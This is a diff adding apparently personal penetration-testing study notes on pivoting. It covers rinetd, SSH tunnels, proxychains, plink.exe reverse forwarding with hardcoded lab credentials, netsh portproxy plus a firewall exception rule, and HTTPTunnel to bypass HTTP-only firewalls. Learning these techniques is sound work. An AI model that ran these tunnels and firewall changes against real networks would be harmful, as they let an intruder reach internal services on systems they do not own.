@@ -1,0 +1,169 @@
+Port Forwarding
+
+
+	Rinetd
+
+
+		adjust the file at /etc/rinetd.conf with the port forwarding info
+		the below will send any traffic sent to your attack machine over to the "contact address" and port
+
+		bindaddress 0.0.0.0
+		bindport 80
+		connectaddress <Google IP, etc>
+		connectport <port>
+
+
+SSH Tunneling
+
+
+	Local Port Forwarding
+
+
+		Explaination: "Hey, forward any traffic to my local port 80 to 127.0.0.1:80 through and on the victim/target"
+
+		ssh -N -L 80:127.0.0.1:80 victim@(IP of target) -p <ssh port on target>
+
+		The command does the following
+
+			We SSH into the target using the victim@(IP of target)
+			Any traffic sent to port (80) on the attack machine
+			will be sent to this target socket (127.0.0.1:80)
+			through the ssh tunnel on the target ssh port
+
+		This command is run on the attacking machine
+		and the ssh connection is from the attacker to the target machine
+
+		-N means "I don't want to actually open an SSH session on the target as 'Victim'".
+		It will look like it's hanging, but it's not. Just ^C to stop the forwarding
+
+
+	Remote Port Forwarding
+
+
+		Explaination: "Hey, any traffic sent to 127.0.0.1:5555, forward that to my local port 5555"
+
+		ssh -N -R 5555:127.0.0.1:5555 victim@(IP of target) -p <ssh port on target>
+
+		The command does the following
+
+			We SSH into the target using the victim@(IP of target)
+			Any traffic sent to the remote machine's port (127.0.0.1:5555)
+			will be sent to our attacking machine on the listening port (5555)
+			through the ssh tunnel on the target port
+
+		This command is run on the attacking machine
+		and the ssh connection is from the attacker to the target machine
+
+		-N means "I don't want to actually open an SSH session on the target as 'Victim'".
+		It will look like it's hanging, but it's not. Just ^C to stop the forwarding
+
+
+	Dynamic Port Forwarding
+
+
+		Explaination: "Hey, any traffic/commands sent to 127.0.0.1:8080, send it through the ssh connection on the target"
+
+		ssh -N -D 127.0.0.1:8080 victim@(IP of target) -p <ssh port on target>
+			add "socks4 127.0.0.1 8080" to the /etc/proxychains.conf file, under [ProxyList]
+				proxychains4 uses "127.0.0.1 9050" by default
+			add "proxychains" to the start of any tool or command that's run on the target subnet
+
+		The command does the following
+
+			We SSH into the target using the victim@(IP of target)
+			Any traffic sent to our proxy
+			will be redirected appropriatedly through the ssh connection
+			through the ssh tunnel on the target port
+
+		This is esentially local port forwarding, but without the need to specify one specific socket to forward traffic to on the target
+
+		-N means "I don't want to actually open an SSH session on the target as 'Victim'".
+		It will look like it's hanging, but it's not. Just ^C to stop the forwarding
+
+
+PLINK.exe
+
+
+	Start with a reverse shell on your windows target
+
+	netstat -anpb TCP to see what services are listening
+
+	transfer over plink.exe
+
+		esentially ssh for windows
+
+		Run the below command on the windows machine
+
+		cmd.exe /c echo y | plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
+
+			Use Plink to start ssh with kali@10.11.0.4
+			Any traffic sent to 10.11.0.4:1234 is forwarded to 127.0.0.1:3306 on the target
+
+
+NETSH
+
+	
+	Windows command line tool netsh
+
+	for port forwarding, needs IP Helper service running and IPv6 support
+
+	netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110
+
+		Windows Firewall disallows inbound TCP connections on 4455 by default. Need to make an exception rule
+
+		netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow
+
+		**Samba on the attacking machine needs SMB2 support
+		**sudo /etc/samba/smb.conf
+		**sudo /etc/init.d/smbd restart
+		**smbclient -L 10.11.0.22 --port=4455 --user=Administrator
+
+
+HTTPTunnel-ing
+
+
+	Can be used with a firewall only allows http traffic through, blocking any ssh port forwarding or tunnelling.
+
+	In this case
+
+		firewall is set to allow inbound port 80, 443, and 1234
+
+		attacking kali machine, on the internet
+
+		compromised victim, behind firewall, only http traffic allowed from internet
+
+		target windows machine, behind firewall, only http traffic allowed from internet
+
+	Order of setup
+
+		(1) VICTIM 
+
+			ssh -L 0.0.0.0:8888:192.168.1.110:3389 student@127.0.0.1
+
+				sets any traffic sent to local port 8888 to be forwarded to 192.168.1.110:3389 through ssh tunneling
+
+		(2) VICTIM
+
+			hts --forward-port localhost:8888 1234
+
+				starts HTTPTunneling server, listens for HTTP traffic directed at localhost:1234 and forwards to localhost:8888
+
+		(3) ATTACKER
+
+			htc --forward-port 8080 10.11.0.128:1234
+
+				sets HTTPTunneling client, will forward any requests made to localhost:8080 to 10.11.0.128:1234
+
+		(FINAL) ATTACKER
+
+			rdesktop 127.0.0.1:8080
+
+				Request goes to 127.0.0.1:8080
+
+				htc client sends to 10.11.0.128:1234 over http port 1234
+				
+				compromised victim receives it on port 1234
+				
+				hts server sends to localhost:8888 
+				
+				ssh tunneling sends request from localhost:8888 to 192.168.1.110:3389
